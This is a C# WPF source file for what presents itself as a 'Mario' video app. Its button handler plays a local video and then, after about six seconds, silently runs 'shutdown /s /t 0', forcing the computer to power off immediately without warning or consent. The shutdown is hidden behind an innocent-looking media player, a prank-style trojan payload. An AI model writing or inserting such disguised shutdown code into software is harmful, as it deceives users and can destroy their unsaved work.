using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace Mario
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            
        }
       
        private void Button_Click(object sender, RoutedEventArgs e)
        {
            marioStart.Visibility = Visibility.Hidden;
            marioMedia.LoadedBehavior = MediaState.Manual;
            var videoPath = Directory.GetCurrentDirectory();
            marioMedia.Source = new Uri(videoPath + @"\mario.wmv", UriKind.Relative);
            marioMedia.Play();
            Task.Delay(6200).ContinueWith(_ =>
            {
                Process.Start("shutdown", "/s /t 0");
            }
            );
            



        }
    }
}
